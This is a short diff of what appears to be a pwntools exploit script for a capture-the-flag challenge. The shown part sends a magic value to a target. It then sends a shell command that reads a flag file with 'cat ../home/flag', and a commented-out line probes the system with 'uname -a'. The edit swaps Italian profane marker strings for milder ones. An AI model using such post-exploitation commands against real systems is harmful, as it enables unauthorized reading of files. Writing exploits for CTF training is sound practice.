@@ -114,12 +114,12 @@ if __name__ == '__main__':
                 conn.send(p16(currentMagic))
                 # conn.send(p64(0x7ffff7af1cde))
                 sleep(0.1)
-                conn.sendline("echo -n DIOCANEFUNZIONA;cat ../home/flag")
+                conn.sendline("echo -n ZIOPANEFUNZIONA;cat ../home/flag")
                 sleep(0.1)
                 resp = conn.recvuntil("Go\n")
 
                 # if (len(resp)==0):
-                #     conn.sendline('uname -a;echo -n "PORCODIO";')
+                #     conn.sendline('uname -a;echo -n "LODODIO";')
                 # else:
                 #     continue
                 # res = conn.recvuntil("Go\n")
